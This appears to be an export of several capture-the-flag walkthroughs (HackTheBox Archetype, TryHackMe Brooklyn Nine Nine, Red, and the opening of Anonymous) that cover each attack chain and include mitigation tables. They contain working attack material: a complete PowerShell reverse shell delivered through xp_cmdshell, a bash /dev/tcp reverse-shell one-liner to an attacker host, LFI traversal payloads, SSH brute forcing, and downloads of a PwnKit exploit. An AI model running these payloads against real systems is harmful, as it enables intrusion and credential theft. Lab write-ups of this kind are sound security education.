writeups.tldrHtml: An SMB backups share was accessible without credentials and contained a SSIS .dtsConfig file with plaintext SQL Server credentials. The account turned out to be a sysadmin — enough to enable xp_cmdshell and run arbitrary commands. A base64-encoded PowerShell reverse shell delivered via xp_cmdshell landed a shell as sql_svc. PowerShell's ConsoleHost_history.txt contained a net use command run by someone mapping a drive with the Administrator password in plaintext. Evil-WinRM with those credentials closed the box.

sections.label: Introduction
sections.html:
Today's target is Archetype — HackTheBox's introductory Windows machine from the Starting Point track. It's a clean, well-structured walkthrough of a Windows-specific attack chain that doesn't appear in Linux-only CTF series: SMB misconfiguration exposing a configuration file, MSSQL sysadmin escalation to OS command execution, and credential reuse discovered through PowerShell's command history file — a real-world finding that shows up in actual Windows engagements regularly. The box also requires working with Windows-specific shell delivery (PowerShell one-liners, UTF-16LE base64 encoding), making it a useful environment calibration exercise for Windows targets specifically.

Prerequisites

Readers are assumed to know:

  • What SMB null sessions are and how anonymous share access is enumerated
  • What a .dtsConfig file is (SQL Server Integration Services package configuration — stores connection strings, often with credentials)
  • What MSSQL xp_cmdshell is and the sp_configure sequence required to enable it
  • Why PowerShell command payloads need UTF-16LE encoding (PowerShell's -EncodedCommand flag expects UTF-16LE base64, not UTF-8)
  • What ConsoleHost_history.txt is and why it's worth reading on any Windows foothold

sections.label: Recon
sections.html:
(~0 mins into the box)

Port Scan

rustscan -a 10.129.95.187 -r 1-65535 --ulimit 5000 -b 500 -t 2000 -- -Pn -sV -sC -T4
PortServiceVersion / Detail
135/tcpMSRPCMicrosoft Windows RPC
139/tcpNetBIOS-SSNWindows netbios-ssn
1433/tcpMSSQLMicrosoft SQL Server 2017 RTM (14.00.1000.00)
5985/tcpWinRMMicrosoft HTTPAPI 2.0 — WinRM endpoint
47001/tcpHTTPMicrosoft HTTPAPI 2.0
49664/tcp, 49666/tcpMSRPCWindows RPC ephemeral ports

Two immediately interesting services: MSSQL on 1433 (authenticated command execution potential via xp_cmdshell) and WinRM on 5985 (remote shell if valid credentials are found). The machine name is ARCHETYPE, confirmed in the MSSQL NTLM info output.

SMB Enumeration

smbclient -L //10.129.95.187 -N
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backups         Disk
C$              Disk      Default share
IPC$            IPC       Remote IPC

backups stands out — a non-default share with no description. The administrative shares (ADMIN$, C$) are standard Windows defaults and require credentials.

smbclient //10.129.95.187/backups -N
smb: \> dir
  prod.dtsConfig    AR    609    Mon Jan 20 17:23:02 2020

Anonymous access to backups works, and it contains a single file: prod.dtsConfig.

smb: \> get prod.dtsConfig

sections.label: Foothold
sections.html:
(~8 mins into the box)

Credentials in prod.dtsConfig

<ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;
Auto Translate=False;</ConfiguredValue>

A .dtsConfig file is an XML-formatted configuration file used by SQL Server Integration Services (SSIS) packages to store connection parameters. Storing credentials in these files — particularly in a network share — is a common misconfiguration in Windows environments. The credentials are always plaintext; there is no encryption.

Credentials found:

UsernamePasswordService
ARCHETYPE\sql_svcM3g4c0rp123Microsoft SQL Server

MSSQL Login — Sysadmin Confirmation

impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
SQL (ARCHETYPE\sql_svc  dbo@master)>

Checking privilege level:

SELECT IS_SRVROLEMEMBER('sysadmin');
-
1

sql_svc is a sysadmin. This is significant — sysadmin in MSSQL is the highest privilege level, and it's sufficient to enable xp_cmdshell, a stored procedure that executes OS commands in the context of the SQL Server service account.

Enabling xp_cmdshell

xp_cmdshell is disabled by default in modern SQL Server installations but can be re-enabled by a sysadmin via sp_configure:

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

Confirming OS-level command execution:

xp_cmdshell "whoami"
output
-----------------
archetype\sql_svc

OS-level RCE as the SQL Server service account.

sections.label: Shell and access
sections.html:
(~20 mins into the box)

Delivering a Reverse Shell via xp_cmdshell

Direct PowerShell commands with URL paths fail inside xp_cmdshell due to SQL Server's handling of forward slashes (/) as syntax:

xp_cmdshell "powershell -c (New-Object System.Net.WebClient).DownloadFile('http://...')"
-- ERROR: Incorrect syntax near '/'

The solution is to encode the entire PowerShell command as UTF-16LE base64 and pass it via PowerShell's -EncodedCommand (or -e) flag, which accepts the command as a single opaque string with no special characters to escape.

Why UTF-16LE specifically? PowerShell is built on .NET, which uses UTF-16LE as its native string encoding. The -EncodedCommand flag expects a base64-encoded UTF-16LE string. Encoding as UTF-8 base64 (the default on Linux) produces the wrong bytes — each character becomes two bytes in UTF-16LE, so a UTF-8 encode produces half the expected length and the command silently fails or runs garbage.

Encoding on Linux:

echo -n '<powershell_command>' | iconv -t UTF-16LE | base64 -w 0

The iconv -t UTF-16LE step converts the UTF-8 output of echo to UTF-16LE before base64 encoding.

First attempt — nc.exe download + execute: The encoded command was built to download nc.exe from the attacker's Python HTTP server and then execute it. The download appeared to succeed (HTTP 200 in the Python server log), but nc.exe was referred to as c.exe in the decoded command — a path corruption artefact from null bytes in the UTF-16LE encoding of the backslash-escaped path string. Abandoned in favour of a self-contained PowerShell reverse shell.

Working payload — pure PowerShell reverse shell (no nc.exe):

$client = New-Object System.Net.Sockets.TCPClient("10.10.15.1",443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()

Encoded and delivered:

echo -n '$client = New-Object ...' | iconv -t UTF-16LE | base64 -w 0
# → <base64_string>
xp_cmdshell "powershell -e <base64_string>"

Listener:

nc -lvnp 443
connect to [10.10.15.1] from (UNKNOWN) [10.129.95.187] 49675
PS C:\Windows\system32>

Navigating to the user flag:

PS C:\Windows\system32> cd C:\Users\sql_svc\Desktop
PS C:\Users\sql_svc\Desktop> type user.txt
3e7b102e78218e935bf3f4951fec21a3

sections.label: Escalation
sections.html:
(~30 mins into the box)

PSReadLine History — Administrator Password

What is ConsoleHost_history.txt? PowerShell's PSReadLine module saves a persistent history of commands entered in interactive sessions to a per-user text file at a predictable path. On Windows 10/Server 2019+, this is:

C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

This file is not cleared on logout, is not protected by any special permissions beyond normal user file ACLs, and is frequently overlooked in privilege escalation checks. In real engagements it's one of the first files to read on any Windows foothold.

type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit

An Administrator credential, used in a net use command to map a drive — typed interactively into PowerShell and duly logged by PSReadLine.

WinRM Login as Administrator

evil-winrm -i 10.129.95.187 -u Administrator -p 'MEGACORP_4dm1n!!'
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
b91ccec3305e98240082d4474b848528

sections.label: The full chain
sections.html:
The complete attack chain:

  1. SMB null session → anonymous backups share → prod.dtsConfig → sql_svc:M3g4c0rp123
  2. impacket-mssqlclient with Windows auth → confirmed sysadmin → enabled xp_cmdshell
  3. UTF-16LE base64-encoded PowerShell reverse shell via xp_cmdshell → shell as archetype\sql_svc → user flag
  4. PSReadLine ConsoleHost_history.txt → net use command with Administrator:MEGACORP_4dm1n!! in plaintext
  5. Evil-WinRM as Administrator → root flag

sections.label: Rabbit holes
sections.html:
nc.exe Path Corruption via UTF-16LE Encoding

The first encoded PowerShell payload combined a DownloadFile call and an immediate nc.exe execution in a single command. The base64 encode used backslash-escaped Windows paths (C:\Users\Public\nc.exe), which — when run through echo -n "..." | iconv -t UTF-16LE | base64 from within a bash double-quoted string — produced null bytes at the backslash positions, truncating the path to C: and then c.exe. The decoded command tried to run c.exe instead of C:\Users\Public\nc.exe, which obviously wasn't found. The fix was switching to a pure PowerShell TCP reverse shell with no filesystem paths at all, which encoded cleanly.

smbmap Initial Access Denied

smbmap -H 10.129.95.187 returned "Access denied" with no authenticated session established — smbmap requires a valid (or at minimum guest-level) session that this configuration didn't grant anonymously. smbclient -L //... -N succeeded instead, and the backups share was directly accessible with -N. The two tools handle unauthenticated enumeration slightly differently; when one fails, try the other.

xp_cmdshell Syntax Errors on Direct PowerShell with URLs

Several attempts to pass PowerShell download commands directly through xp_cmdshell "powershell -c ..." failed with Incorrect syntax near '/'. SQL Server's parser interprets the forward slashes in http:// as a division operator in certain contexts before the string ever reaches PowerShell. The -EncodedCommand flag sidesteps this entirely since the payload is a single opaque base64 string.

sections.label: Mitigations
sections.html:
VulnerabilitySeverityMitigation
SSIS .dtsConfig with plaintext credentials in anonymous SMB shareCriticalNever store credentials in SSIS config files; use Windows credential stores or encrypted connection managers; never expose configuration shares without authentication
SQL Server service account with sysadmin roleHighService accounts should have the minimum required SQL Server permissions; sysadmin should be reserved for DBAs, never service accounts
xp_cmdshell enabled (or re-enableable by a compromised sysadmin)HighDisable xp_cmdshell and audit who has permission to re-enable it; consider using SQL Server's surface area configuration to restrict it at a deeper level
Administrator password typed in plaintext in a net use commandCriticalNever include credentials in command-line arguments — they persist in shell history files; use cmdkey or Windows Credential Manager for persistent drive mappings
PSReadLine history file accumulating sensitive commandsMediumClear ConsoleHost_history.txt periodically; consider setting Set-PSReadLineOption -HistorySaveStyle SaveNothing on sensitive administrative accounts

writeups.takeawayHtml: ConsoleHost_history.txt is the Windows equivalent of .bash_history — and people are far less likely to think about clearing it. Any administrator who has typed credentials into a PowerShell prompt has potentially left them in this file, readable by anyone who subsequently compromises that account's session. It should be on every Windows post-exploitation checklist, right after sudo -l equivalents.
writeups.againHtml: Skip the nc.exe staging entirely and go straight to the pure PowerShell reverse shell — it's self-contained, requires no file transfer, and avoids the whole class of path-encoding problems that come with combining download and execute in a single -EncodedCommand payload. On Windows targets, fewer moving parts means fewer failure modes.

writeups.title: Brooklyn Nine Nine
writeups.summary: An anonymous FTP login hands over a note hinting that Jake's password is weak, and the site's HTML source drops a not-so-subtle "have you heard of…
writeups.takeaway: A correct password attached to a guessed username is indistinguishable from a wrong password until you actually check /etc/passwd or /home — verify the account name before burning login attempts.
writeups.tldrHtml: An anonymous FTP login hands over a note hinting that Jake's password is weak, and the site's HTML source drops a not-so-subtle "have you heard of steganography?" comment pointing at the homepage background image. Cracking that image with stegseek and rockyou.txt reveals Holt's password buried inside — but a username mix-up (holts instead of holt) burns the first login attempt. Brute-forcing Jake's SSH login instead gets a foothold, confirms the leaked password was right all along, and a sudo -l check on Holt's account turns up a NOPASSWD nano entry that doesn't pan out — the actual root read comes through Jake's own sudo less GTFOBin entry.

sections.label: Introduction
sections.html: *Today's victim is run by Brooklyn's finest* — or at least, a box themed after them. Somewhere between an anonymous FTP share, a suspiciously generic stock background image, and two squad members who really should have used a password manager, there's a root flag waiting. Captain Holt would not be pleased with how this one goes down.

sections.label: Recon
sections.html:
Standard nmap service scan against the target:

nmap -sV -sC 10.49.142.139
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).

Cleaned up as a table:

PortServiceVersion
21FTPvsftpd 3.0.3 (anonymous login allowed)
22SSHOpenSSH 7.6p1 (Ubuntu)
80HTTPApache 2.4.29 (Ubuntu)

*The ftp-anon line in the nmap output is doing a lot of the work here* — anonymous FTP access is practically an open invitation, and there's already a named file (note_to_jake.txt) sitting in the root of the share.

Anonymous FTP grab

ftp 10.49.142.139
# Name: anonymous
# Password: (blank)
230 Login successful.
ftp> get note_to_jake.txt
226 Transfer complete.
cat note_to_jake.txt
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

*Subtle as a brick* — but useful. This confirms Jake is a valid username and that his password is expected to be weak, which is basically a green light for a wordlist-based brute force later.

Poking at the website

Viewing the page source of the homepage:

curl -s http://10.49.142.139/ | grep -A2 -B2 "!--"
<div class="bg"></div>
<p>This example creates a full page background image...</p>
<!-- Have you ever heard of steganography? -->

A hidden HTML comment directly asking about steganography. *Not exactly a riddle, but it tells us exactly where to look next* — the background image referenced earlier in the page's CSS.

Feroxbuster was run twice — once against a common wordlist, once against a much larger subdomain list — *and came back essentially empty both times* aside from the index page itself. No hidden directories to chase here; the real path forward was always going to be that image.

sections.label: Foothold
sections.html:
Pulling and inspecting the image

wget http://10.49.142.139/brooklyn99.jpg
exiftool brooklyn99.jpg

ExifTool came back clean — *standard JPEG metadata, nothing embedded in the EXIF fields themselves.* binwalk was equally uneventful, reporting just a plain JPEG structure with no obviously appended files. *This pointed toward a passphrase-protected steganography tool like steghide rather than a raw file concatenation trick.*

A direct steghide extract attempt without a passphrase failed outright:

steghide extract -sf brooklyn99.jpg
steghide: can not uncompress data. compressed data is corrupted.

An empty passphrase wasn't going to cut it — time to brute force the passphrase itself instead of the extraction.

Cracking the steg passphrase

stegseek automates exactly this: it takes a wordlist and tries each entry as a steghide passphrase until one successfully extracts embedded data.

Running stegseek against the image using rockyou as the candidate passphrase list:

stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt
[i] Found passphrase: "admin"
[i] Original filename: "note.txt".
[i] Extracting to "brooklyn99.jpg.out".
# ^^^ this is the important bit
  • the passphrase itself turned out to be the painfully generic admin
  • *this took an embarrassingly short amount of time* given the simplicity of the password, but the bigger time sink had been the dead-end metadata checks before reaching for stegseek at all

Reading the extracted file:

cat brooklyn99.jpg.out
Holts Password:
fluffydog12@ninenine

Enjoy!!

*(~8 mins into the box)* — a clean credential, handed over in plaintext. The only catch: it's labeled for "Holt," not for the actual system username.

sections.label: Shell and access
sections.html:
The username trap

The note says "Holts Password" — *a reasonably natural reading of that is the username being holts,* so that's what got tried first:

ssh holts@10.49.142.139
holts@10.49.142.139: Permission denied (publickey,password).

*Three strikes and out.* Rather than burn more attempts guessing username variations, the smarter move was pivoting to the other known username — Jake — and brute-forcing his login instead, using the explicit "weak password" hint from the FTP note as justification for going straight to rockyou.

Brute forcing Jake

hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.49.142.139
[22][ssh] host: 10.49.142.139   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
UsernamePasswordWhere found
jake987654321Hydra brute force against rockyou.txt
holtfluffydog12@ninenineSteghide-extracted note.txt inside brooklyn99.jpg
ssh jake@10.49.142.139
jake@brookly_nine_nine:~$ ls /home
amy  holt  jake

*And there it is* — the actual home directory is holt, not holts. The earlier failed login wasn't a wrong password, it was a wrong username the whole time.

su holt
# Password: fluffydog12@ninenine
holt@brookly_nine_nine:/home/jake$

Confirmed — the steg-extracted password was correct all along; it just needed the right account name attached to it.

holt@brookly_nine_nine:~$ cat user.txt
ee11cbb19052e40b07aac0ca060c23ee

User flag captured. *(~16 mins into the box)*

sections.label: Escalation
sections.html:
Checking sudo rights

Standard privilege check as holt:

sudo -l
User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano

nano running as root with no password is a textbook GTFOBins entry — *nano can normally be used to spawn a root shell via its built-in command-execution feature.* This attempt didn't pan out within the session (see Rabbit Holes), so the check was repeated on Jake's account instead:

su jake
sudo -l
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less

less is an even more reliable GTFOBin — *when sudo grants passwordless less, you can simply open any file and use less's internal shell escape to drop into a root shell, or in this case just page through restricted files directly as root.*

Reading root.txt

sudo /usr/bin/less /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!

Root flag captured. *(~22 mins into the box)*

sections.label: Rabbit holes
sections.html:
EXIF and binwalk on the image: Both came back clean, *which in hindsight was the actual signal to move straight to a passphrase-protected steg tool rather than a spending more time digging through metadata.* The HTML comment had already pointed at "steganography" specifically, so a passphrase-based approach (steghide/stegseek) should have been the first move rather than the third.

holts vs holt: The note's phrasing ("Holts Password") reads naturally as a username, but it was actually just a possessive ("Holt's password") describing whose credential it was. *A quick ls /home after landing on the box would have settled this immediately instead of guessing.* This burned the SSH attempt limit on a perfectly valid password attached to the wrong account name.

/bin/nano as holt: The NOPASSWD sudo entry for nano looked like the obvious privesc path, and the command was run directly against /root/root.txt. *No output or shell escape was captured from this attempt in the session* — nano's GTFOBins technique typically requires using its in-editor command execution (^R^X, then reset; sh 1>&0 2>&0) rather than just opening a file directly, which likely explains why this didn't produce a usable result on its own. The working path ended up being Jake's separate less entitlement instead.

sections.label: Mitigations
sections.html:
VulnerabilitySeverityMitigation
Anonymous FTP access enabledMediumDisable anonymous FTP login entirely unless explicitly required, and never store sensitive notes on a publicly readable share
Credentials embedded in steganographic imageMediumNever distribute credentials via hidden files, even "obscured" ones — security through obscurity is not access control
Weak, wordlist-crackable passwordsHighEnforce strong password policies and rate-limit/lock out SSH after repeated failed attempts
Passwordless sudo on nanoCriticalAvoid NOPASSWD sudo grants for any editor or pager binary; if required, use a restricted wrapper instead of the raw binary
Passwordless sudo on lessCriticalSame as above — pagers with shell-escape capability are equivalent to a full root shell when granted via sudo

writeups.takeawayHtml: A correct password attached to a guessed username is indistinguishable from a wrong password until you actually check /etc/passwd or /home — verify the account name before burning login attempts.
writeups.againHtml: I'd jump straight to stegseek with rockyou the moment the HTML comment mentioned steganography, instead of spending time on EXIF and binwalk checks first.

writeups.title: Red
writeups.summary: An LFI in a "free business template" PHP app leaks its own source code via php://filter, exposing a single-pass sanitization flaw that's trivially…
writeups.takeaway: A sanitization function that only runs once is functionally the same as no sanitization at all — always test traversal filters by nesting the very sequence they claim to strip.
writeups.tldrHtml: An LFI in a "free business template" PHP app leaks its own source code via php://filter, exposing a single-pass sanitization flaw that's trivially bypassed. That LFI leads to a leaked password reminder, which gets mutated with hashcat rules into a real password for the user blue. From there, an actively hostile red user is found editing /etc/hosts and killing shells in real time, eventually getting lateral'd into via a reverse shell back-connect. A SUID pkexec binary is found but the PwnKit exploit fails due to a GLIBC version mismatch between attacker and target.

sections.label: Introduction
sections.html: *Today's victim is a humble little Apache box hiding behind a free "Atlanta" business template* — the kind of site you'd scroll past without a second glance. But scratch the surface of index.php?page= and something interesting happens: the page parameter doesn't just load content, it reads files. And buried somewhere on this box are two users locked in what can only be described as a turf war — one of them is about to find out the hard way that "Red Rules" wasn't just a username flex.

sections.label: Recon
sections.html:
Standard nmap service scan against the target:

nmap -sV -sC 10.49.179.19
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Atlanta - Free business bootstrap template
|_Requested resource was /index.php?page=home.html
| http-methods:
|_  Supported Methods: GET HEAD POST

Cleaned up as a table:

PortServiceVersion
22SSHOpenSSH 8.2p1 (Ubuntu)
80HTTPApache 2.4.41 (Ubuntu)

The first thing that jumps out is the URL itself: visiting the root IP redirects straight to index.php?page=home.html. *A page= parameter that loads a .html file by name is basically a neon sign reading "try LFI here."*

Feroxbuster was thrown at the site for good measure:

feroxbuster -u http://10.49.179.19 -w /usr/share/wordlists/dirb/common.txt

*Didn't turn up anything worth reporting* — no juicy hidden directories. The real way in was always going to be that page parameter.

sections.label: Foothold
sections.html:
Understanding the vulnerability

Local File Inclusion happens when an application takes user input and feeds it directly into a file-read function (include, readfile, etc.) without properly validating it. If the app strips dangerous sequences like ../ but only does it once, you can often smuggle a traversal sequence past the filter by nesting it — the classic ....// trick. The filter removes the inner ../, and what's left collapses back into a working traversal sequence.

A single line before the payload: this is the core LFI request structure used against the target.

http://10.49.179.19/index.php?page=php://filter/resource=.....///.....///.....///.....///[TARGET_FILE]

This nested ...../// sequence is the bypass:

  • each str_replace pass on ../ or ./ only fires once, so wrapping the traversal in extra junk characters leaves a valid ../ behind after stripping

Pulling the source code

Rather than guessing at the filter logic, the smart move is to make the app hand over its own source. php://filter/convert.base64-encode/resource= is a PHP stream wrapper that reads a file and returns it base64-encoded — useful because PHP files would otherwise just execute instead of displaying as text.

Requesting the app's own index.php through the filter wrapper:

curl http://10.49.179.19/index.php?page=php://filter/convert.base64-encode/resource=index.php -o index.php

Decoding the result locally:

base64 --decode index.php
<?php

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>

This explains everything in one shot:

  • The regex gate (^[a-z]) requires the parameter to *start* with a lowercase letter — so an absolute path like /etc/passwd is rejected outright, since it starts with /
  • The sanitization flaw: str_replace only runs once per pattern, no loop, no recursion — which is exactly why the nested ...../// sequence survives
  • The stream wrapper advantage: php://filter starts with p, satisfying the regex for free, and never contains ../ at all, so it sails through sanitize_input() completely untouched

*(~6 mins into the box)* — once the source confirmed the theory, it was just a matter of pointing the same wrapper at more interesting files.

Reading sensitive files

Apache's vhost config, read through the same LFI:

curl "http://10.49.179.19/index.php?page=php://filter/resource=/etc/apache2/sites-enabled/000-default.conf"

This confirmed DocumentRoot at /var/www/html and standard ${APACHE_LOG_DIR} log paths — nothing groundbreaking, but useful for orientation. *An attempt to read /proc/self/environ for environment variable leakage returned a blank page* — likely blocked by kernel-level restrictions on that particular proc path.

Enumerating /etc/passwd turned up two non-system users: blue and red. *Given the room's name and the .reminder file convention common in these boxes, checking home directories for stray notes felt like the obvious next move.*

Pulling a hidden reminder file out of blue's home directory:

curl "http://10.49.179.19/index.php?page=php://filter/resource=/home/blue/.reminder"
sup3r_p@s$w0rd!

A bare password string sitting in a dotfile. Almost too easy — except this wasn't the actual SSH password, just the seed for one.

sections.label: Shell and access
sections.html:
From base string to real password

The .reminder string clearly wasn't going to work as-is over SSH — bash_history on the box hinted that the real password had been run through a best64 rule mutation, with a strong nudge that the red user ("Red rules") was the one applying it.

Generating a candidate wordlist from the reminder string using hashcat's rule engine:

echo 'sup3r_p@s$w0rd!' > .reminder
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best66.rule > passlist.txt
  • --stdout — print the mutated wordlist to stdout instead of trying to crack a hash with it
  • -r — apply a rule file, which defines mutation operations (case toggles, prepends, appends, character substitutions) to each input word

This is where things briefly went sideways — see the Rabbit Holes section for the John-vs-Hashcat rule parsing saga that happened first.

Brute forcing SSH

Throwing the mutated wordlist at both discovered users:

hydra -l blue -P passlist.txt ssh://10.49.179.19
[22][ssh] host: 10.49.179.19   login: blue   password: thesup3r_p@s$w0rd!
1 of 1 target successfully completed, 1 valid password found
# ^^^ this is the important bit
UsernamePasswordWhere found
bluethesup3r_p@s$w0rd!Hashcat best64-rule mutation of /home/blue/.reminder

Logging in as blue:

ssh blue@10.49.179.19
blue@red:~$ ls
flag1
blue@red:~$ cat flag1
THM{Is_thAt_all_y0u_can_d0_blU3?}

First flag down. *(~25 mins into the box)*

The hostname fight

Things get weird here. The box's prompt reads blue@red — *blue is SSHing into a machine whose hostname is literally "red,"* which lines up with the room's whole "Red Rules, Blue Drools" framing. While poking around, taunting messages started appearing directly in the terminal output — someone (presumably red, scripted or live) was actively interacting with the same box:

blue@red:~$ Don't be silly Blue, you will never win

An attempt to add a hosts entry for a pivot domain (redrules.thm) succeeded, and a reverse shell back-connect was attempted from blue's session:

echo "192.168.134.217 redrules.thm" | tee -a /etc/hosts
bash -c 'nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &'

The session got killed almost immediately:

blue@red:~$ Say Bye Bye to your Shell Blue and that password
Get out of my machine Blue!!
Connection to 10.49.179.19 closed by remote host.

*This took an embarrassingly stubborn series of reconnects to push past* — the blue password even appears to have been rotated mid-session (!dr0w$s@p_r3pus, a reversed variant of the original), requiring another Hydra run against the same mutated wordlist to recover access:

[22][ssh] host: 10.49.179.19   login: blue   password: !dr0w$s@p_r3pus

A subsequent message left in /etc/hosts edits, decoded from base64, turned out to be another taunt rather than a useful credential:

echo "WW91IHJlYWxseSBzdWNrIGF0IHRoaXMgQmx1ZQ==" | base64 -d
You really suck at this Blue

Catching the lateral shell

Despite the interference, the reverse shell attempt from blue eventually connected back to a listener:

nc -nvlp 9001
connect to [192.168.134.217] from (UNKNOWN) [10.49.179.19] 51530
red@red:~$ ls
flag2
red@red:~$ cat flag2
THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}

That reverse shell landed as red, not blue — *most likely the cron job or script running red's side of the taunting also owned the process that picked up the back-connect, or red's account was what actually executed the queued reverse shell command from blue's typed input.* Either way, second flag captured. *(~40 mins into the box)*

sections.label: The full chain
sections.html:
Hunting for privilege escalation

With a shell as red, the standard SUID sweep was run:

Searching for SUID binaries that might allow privilege escalation:

find / -type f -perm -04000 -ls 2>/dev/null

Buried in the (mostly standard) output was something unusual:

418507     32 -rwsr-xr-x   1 root     root        31032 Aug 14  2022 /home/red/.git/pkexec

*A SUID copy of pkexec sitting inside a hidden .git directory in red's own home folder* — not a system path, clearly placed there deliberately as part of the challenge.

./pkexec --version
pkexec version 0.105

Pkexec 0.105 is vulnerable to CVE-2021-4034, better known as PwnKit — a local privilege escalation flaw in Polkit's pkexec caused by improper handling of argument count and environment variables, allowing an unprivileged user to escalate to root through a crafted execution context.

Attempting PwnKit (EDB-50689)

The plan: pull down a PwnKit PoC, patch the hardcoded pkexec path to point at the home-directory copy, compile, and run.

#define BIN "/usr/bin/pkexec"

changed to:

#define BIN "/home/red/.git/pkexec"

A small local web server on the attacker box served the patched exploit, a helper shared object, and a compiled binary:

wget http://192.168.134.217:4443/exploit.c
wget http://192.168.134.217:4443/evil-so.c
wget http://192.168.134.217:4443/exploit
wget http://192.168.134.217:4443/evil.so
chmod +x exploit
./exploit
./exploit: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./exploit)

*This is the important failure line* — the binary was linked against a GLIBC version the target simply doesn't have.

See the Rabbit Holes section below for the full breakdown of why, and what the correct fix would have been.

sections.label: Rabbit holes
sections.html:
John rule syntax fed into Hashcat: The first attempt at generating the credential wordlist ran John the Ripper's best64.rule file directly through Hashcat's --stdout engine. Hashcat couldn't fully parse John's native rule syntax and silently dropped most of the rules, producing only 20 mutated words instead of a full expansion. *Recreating a Hashcat-native version of the best64 rule set from scratch fixed this* — the two tools' rule grammars aren't drop-in compatible even though they look similar on the surface.

PwnKit GLIBC mismatch: The patched PwnKit exploit was compiled on a Kali Rolling attacker machine running GLIBC 2.42, while the target was Ubuntu 20.04 on GLIBC 2.31. The compiled binary ended up requiring the symbol __libc_start_main@GLIBC_2.34, which doesn't exist on the target's older libc — even though the exploit's actual source code only calls older, widely-available functions like execve and system. The incompatibility came entirely from the build environment, not the exploit logic itself. *The correct fix would have been compiling in a container or VM matching Ubuntu 20.04 / GLIBC 2.31, or compiling directly on the target* — but no compiler (gcc) was available on the box, and write access to install one via apt was blocked by missing dpkg lock permissions. This was documented rather than chased further given time constraints.

Two minor compile fixes were also needed along the way for the supporting evil-so.c and exploit.c files — missing #include <grp.h> and #include <unistd.h> respectively — *likely due to stricter default header inclusion behavior on newer glibc/gcc toolchains than whatever the original PoC was written against.*

sections.label: Mitigations
sections.html:
VulnerabilitySeverityMitigation
LFI via page parameterHighUse a strict allowlist of permitted filenames instead of blocklist-based sanitization; never pass user input directly into readfile()
Single-pass str_replace sanitizationHighApply sanitization in a loop until no more matches are found, or better, reject any input containing path separators entirely
Credentials stored in plaintext dotfilesMediumNever store passwords or password seeds in user-readable home directory files, even "hidden" ones
SUID pkexec binary in non-standard locationCriticalAudit the filesystem regularly for unexpected SUID binaries; patch Polkit to a version beyond CVE-2021-4034
Weak/predictable SSH password policyMediumEnforce strong, randomly generated credentials and consider disabling password auth in favor of key-based SSH

writeups.takeawayHtml: A sanitization function that only runs once is functionally the same as no sanitization at all — always test traversal filters by nesting the very sequence they claim to strip.
writeups.againHtml: I'd spin up a matching Ubuntu 20.04 / GLIBC 2.31 container locally before touching the PwnKit exploit, instead of compiling on Kali Rolling and discovering the version mismatch after the fact.

writeups.title: Anonymous
writeups.summary: A world-writable FTP scripts/ directory contained a cleanup script that runs on a schedule, plus a to-do note literally saying "I really need to…
writeups.takeaway: A growing log file with repeated identical entries is direct evidence of a scheduled task — and a writable script anywhere in that execution chain is a privilege escalation path regardless of whether sudo -l or SUID enumeration shows anything interesting at all. Always check what owns and triggers a script before assuming a quiet sudo -l output means there's no path forward.
writeups.tldrHtml: A world-writable FTP scripts/ directory contained a cleanup script that runs on a schedule, plus a to-do note literally saying "I really need to disable the anonymous login." The cleanup script was overwritten via FTP with a Python reverse shell payload; the next scheduled run executed it, landing a shell as namelessone. SUID /usr/bin/env finished the job — a one-line GTFOBins escape to root.

